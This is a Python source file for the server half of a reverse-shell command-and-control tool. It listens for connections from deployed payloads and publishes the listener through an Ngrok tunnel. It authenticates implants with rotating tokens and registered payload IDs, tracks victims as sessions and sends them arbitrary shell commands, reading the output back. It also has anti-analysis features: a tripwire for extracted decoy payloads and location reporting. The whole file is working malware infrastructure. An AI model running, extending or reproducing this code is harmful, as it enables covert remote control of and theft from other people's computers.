#!/usr/bin/env python3
"""
Server Module - TCP server with rotating auth
"""
import queue
import socket
import threading
import time

from core.logger import get_logger
from core.auth import Auth
from core.session_manager import SessionManager
from core.ngrok_manager import NgrokManager


class Server:
    """Reverse shell TCP server with rotating auth"""
    
    def __init__(
        self,
        host,
        port,
        auth_secret=None,
        rotation_seconds=3600,
        grace_windows=1,
        session_manager=None,
        server_state=None,
    ):
        self.host = host
        self.port = port
        self.sessions = session_manager or SessionManager()
        self.log = get_logger('server')
        
        if server_state is not None:
            self.server_state = server_state
            _effective_secret = server_state.get_secret()
        else:
            self.server_state = None
            _effective_secret = auth_secret

        self.auth = Auth(
            master_secret=_effective_secret,
            rotation_seconds=rotation_seconds,
            grace_windows=grace_windows,
        )
        
        self._server_socket = None
        self._running = False
        self._accept_thread = None
        self._keepalive_thread = None
        self._rotation_thread = None
        self.ngrok = NgrokManager(port=self.port)
        
        # Callbacks
        self.on_log = None
        self.on_client_connected = None
        self.on_client_disconnected = None
        self.on_client_message = None
        self.on_token_rotated = None
    
    # ============================================
    # Lifecycle
    # ============================================
    def start(self):
        if self._running:
            return False

        # Start Ngrok alongside the server (best-effort)
        if self.ngrok:
            if self.ngrok.start() and self.ngrok.public_url:
                self._emit_log(f"[+] Ngrok: tcp://{self.ngrok.public_url}", 'info')
            else:
                self._emit_log("[-] Ngrok failed to start (local-only mode)", 'warning')

        try:
            self._server_socket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM
            )
            self._server_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )
            self._server_socket.bind((self.host, self.port))
            self._server_socket.listen(5)
            self._server_socket.settimeout(1.0)
            
            self._running = True
            
            self._accept_thread = threading.Thread(
                target=self._accept_loop, daemon=True, name="Server-Accept"
            )
            self._accept_thread.start()
            
            self._keepalive_thread = threading.Thread(
                target=self._keepalive_loop, daemon=True, name="Server-Keepalive"
            )
            self._keepalive_thread.start()
            
            self._rotation_thread = threading.Thread(
                target=self._rotation_loop, daemon=True, name="Server-Rotation"
            )
            self._rotation_thread.start()
            
            local_ip = self._get_local_ip()
            self._emit_log(
                f"[+] Server listening on {self.host}:{self.port}", 'success'
            )
            self._emit_log(f"[*] Local IP: {local_ip}", 'info')
            self._emit_log(
                f"[*] Rotation: every {self.auth.rotation_seconds}s "
                f"(grace: {self.auth.grace_windows})",
                'info',
            )
            self._emit_log(
                f"[*] Current token: {self.auth.token}", 'highlight'
            )
            self._emit_log(
                f"[*] Next rotation in {self.auth.time_until_rotation}s",
                'info',
            )
            return True
            
        except OSError as e:
            self._emit_log(f"[!] Failed to start server: {e}", 'error')
            self._cleanup()
            return False
    
    def stop(self):
        if not self._running:
            return

        if self.ngrok:
            self.ngrok.stop()
        self._running = False
        self._emit_log("[*] Server stopping...", 'warning')
        
        for session in self.sessions.all():
            try:
                session.socket.send(b'exit\n')
            except:
                pass
            try:
                session.socket.close()
            except:
                pass
        
        self.sessions.clear()
        self._cleanup()
        self._emit_log("[*] Server stopped", 'warning')
    
    def _cleanup(self):
        if self._server_socket:
            try:
                self._server_socket.close()
            except:
                pass
            self._server_socket = None
    
    @property
    def running(self):
        return self._running
    
    # ============================================
    # Token rotation
    # ============================================
    def _rotation_loop(self):
        """Notify when tokens rotate"""
        last_token = self.auth.token
        while self._running:
            time.sleep(5)
            if not self._running:
                break
            
            current = self.auth.token
            if current != last_token:
                self._emit_log(
                    f"[🔑] Token rotated: {current}", 'highlight'
                )
                self._emit_log(
                    f"[*] Next rotation in {self.auth.time_until_rotation}s",
                    'info',
                )
                if self.on_token_rotated:
                    self._safe_callback(self.on_token_rotated, current)
                last_token = current
    
    def get_current_token(self):
        """Get the current valid token"""
        return self.auth.token
    
    def get_token_info(self):
        """Get info about current token"""
        return {
            'token': self.auth.token,
            'expires_in': self.auth.time_until_rotation,
            'rotation_seconds': self.auth.rotation_seconds,
            'grace_windows': self.auth.grace_windows,
        }
    
    # ============================================
    # Local IP
    # ============================================
    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    # ============================================
    # Accept
    # ============================================
    def _accept_loop(self):
        while self._running:
            try:
                client, addr = self._server_socket.accept()
                client.settimeout(5.0)
                
                self._emit_log(
                    f"[*] New connection from {addr[0]}:{addr[1]}", 'info'
                )
                
                threading.Thread(
                    target=self._handle_client,
                    args=(client, addr),
                    daemon=True,
                    name=f"Client-{addr[0]}:{addr[1]}",
                ).start()
                
            except socket.timeout:
                continue
            except OSError:
                if self._running:
                    self._emit_log("[!] Accept error", 'error')
                break
    
    # ============================================
    # Client handling
    # ============================================
    def _handle_client(self, client, addr):
        ok, identity = self._authenticate(client, addr)
        if not ok:
            try:
                client.close()
            except:
                pass
            return
        
        session_id = self.sessions.add(client, addr)
        session = self.sessions.get(session_id)
        if identity is not None:
            session.payload_uuid = identity['payload_uuid']
        
        self._emit_log(
            f"[+] Authenticated: {addr[0]}:{addr[1]} (Session #{session_id:04d})",
            'success',
        )
        
        if self.on_client_connected:
            self._safe_callback(self.on_client_connected, session)
        
        try:
            self._client_read_loop(client, session)
        except Exception as e:
            self.log.error(f"Client error: {e}")
        finally:
            self._disconnect_client(session)
    
    def _authenticate(self, client, addr):
        """Authenticate with rotating token"""
        try:
            data = client.recv(1024).decode().strip()
            parsed = self.auth.parse_auth(data)

            is_valid = False
            token_used = None
            identity = None

            if parsed is not None:
                token_used = parsed.get("token")
                if token_used and self.auth.validate(token_used):
                    if parsed["kind"] == "legacy":
                        is_valid = True
                    elif parsed["kind"] == "identity":
                        if self.server_state is not None:
                            if (parsed["server_uuid"] == self.server_state.server_uuid
                                    and self.server_state.has_payload(parsed["payload_uuid"])):
                                is_valid = True
                                identity = parsed

            if is_valid:
                if identity is not None:
                    self.server_state.touch_payload(identity["payload_uuid"])
                    client.send(b"AUTH_SUCCESS\n")
                    self._emit_log(
                        f"[+] Auth OK from {addr[0]}:{addr[1]} "
                        f"(payload {identity['payload_uuid'][:8]}...)",
                        'success',
                    )
                else:
                    client.send(b"AUTH_SUCCESS\n")
                    self._emit_log(
                        f"[+] Auth OK from {addr[0]}:{addr[1]} "
                        f"(legacy, token {token_used[:8]}...)",
                        'success',
                    )
                return True, identity

            # Failed — figure out why for the log
            if parsed is None:
                reason = "malformed AUTH"
            elif not token_used or not self.auth.validate(token_used):
                reason = "invalid token"
            elif parsed["kind"] == "identity" and self.server_state is not None:
                if parsed["server_uuid"] != self.server_state.server_uuid:
                    reason = f"wrong server ({parsed['server_uuid'][:12]})"
                elif not self.server_state.has_payload(parsed["payload_uuid"]):
                    reason = f"unregistered payload ({parsed['payload_uuid'][:8]}...)"
                else:
                    reason = "rejected"
            else:
                reason = "rejected"

            client.send(b"AUTH_FAILED\n")
            self._emit_log(
                f"[-] Auth FAILED from {addr[0]}:{addr[1]} ({reason})",
                'error',
            )
            return False, None
        except:
            return False, None
    
    def _client_read_loop(self, client, session):
        buffer = b""
        while self._running and session.active:
            try:
                client.settimeout(2.0)
                chunk = client.recv(4096)
                client.settimeout(None)
                
                if not chunk:
                    break
                
                # Feed the per-session response queue. send_command drains
                # stale chunks, then reads until the RESP_END sentinel.
                session.response_queue.put(chunk)
                buffer += chunk
                session.touch()
                
                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    message = line.decode(errors='ignore').strip()
                    if message:
                        self._process_message(session, message)
            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError):
                break
            except:
                break
    
    def _process_message(self, session, message):
        # Filter sentinel framing — those are command responses, already
        # captured by send_command via response_queue.
        if message == self.RESP_BEGIN:
            session.in_response = True
            return
        if message == self.RESP_END:
            session.in_response = False
            return
        if getattr(session, "in_response", False):
            return

        # Tripwire: a decoy payload was extracted and fired at us.
        if message.strip() == "Nice try dumbass":
            self._emit_log(
                f"[!] TRIPWIRE — extraction attempt from {session.address}",
                "error",
            )
            self._disconnect_client(session)
            return

        if message.startswith("[+] Client location:"):
            path = message.split(":", 1)[1].strip()
            self._emit_log(
                f"[*] Client {session.address} at: {path}", 'info'
            )
        elif message.startswith("[+] MOVED to:"):
            path = message.split(":", 1)[1].strip()
            self._emit_log(
                f"[*] Client {session.address} moved to: {path}", 'warning'
            )
        else:
            if self.on_client_message:
                self._safe_callback(self.on_client_message, session, message)
    
    def _disconnect_client(self, session):
        if not session:
            return
        # Idempotent: if session is already inactive, someone else
        # handled the disconnect — don't double-fire callbacks.
        if not session.active:
            return
        self.sessions.set_active(session.id, False)
        self.sessions.remove(session.id)
        try:
            session.socket.close()
        except:
            pass
        self._emit_log(
            f"[-] Client disconnected: {session.address} "
            f"(Session #{session.id:04d})",
            'warning',
        )
        if self.on_client_disconnected:
            self._safe_callback(self.on_client_disconnected, session)
    
    # ============================================
    # Keepalive
    # ============================================
    def _keepalive_loop(self):
        while self._running:
            time.sleep(25)
            if not self._running:
                break
            for session in self.sessions.active():
                try:
                    session.socket.send(b"\n")
                    session.touch()
                except:
                    pass
    
    # ============================================
    # Command execution
    # ============================================
    #: Sentinels that frame a command response on the wire.
    #: They never appear in real output, so the client echoes them verbatim
    #: and the server reads until END is seen.
    RESP_BEGIN = "<<<RSC_BEGIN>>>"
    RESP_END = "<<<RSC_END>>>"

    def send_command(self, session_id, command, timeout=10.0):
        """Send a command; read the framed response via the session queue.

        The client's handler thread is the *sole* reader of the socket and
        pushes received bytes into ``session.response_queue``. This method
        drains stale chunks, sends the command, then waits for a full
        ``RESP_BEGIN ... RESP_END`` frame on the queue.
        """
        session = self.sessions.get(session_id)
        if not session:
            return False, "Session not found"
        if not session.active:
            return False, "Session is inactive"
        if not command.strip():
            return False, "Empty command"

        try:
            # Drain stale chunks so we don't confuse them with this response.
            while True:
                try:
                    session.response_queue.get_nowait()
                except queue.Empty:
                    break

            session.socket.send((command + "\n").encode())
            session.touch()

            deadline = time.time() + timeout
            raw = b""
            end_bytes = self.RESP_END.encode()

            while time.time() < deadline:
                try:
                    chunk = session.response_queue.get(
                        timeout=max(0.01, min(0.5, deadline - time.time()))
                    )
                except queue.Empty:
                    continue
                raw += chunk
                if end_bytes in raw:
                    break

            if end_bytes not in raw:
                return False, f"Timeout waiting for response (got {len(raw)} bytes)"

            text = raw.decode(errors='replace')
            begin = text.find(self.RESP_BEGIN)
            end = text.find(self.RESP_END)
            if begin == -1 or end == -1 or end < begin:
                return False, f"Malformed response: {text[:200]!r}"

            output = text[begin + len(self.RESP_BEGIN):end]
            if output.startswith("\n"):
                output = output[1:]
            if output.endswith("\n"):
                output = output[:-1]
            return True, output if output else "(no output)"
        except Exception as e:
            return False, f"Error: {e}"

    # ============================================
    # Helpers
    # ============================================
    def _emit_log(self, message, tag='info'):
        if tag == 'error':
            self.log.error(message)
        elif tag == 'warning':
            self.log.warning(message)
        else:
            self.log.info(message)
        if self.on_log:
            self._safe_callback(self.on_log, message, tag)
    
    def _safe_callback(self, callback, *args):
        if not callback:
            return
        try:
            callback(*args)
        except Exception as e:
            self.log.error(f"Callback error: {e}")
    
    def __repr__(self):
        status = "running" if self._running else "stopped"
        return f"Server({self.host}:{self.port}, {status})"
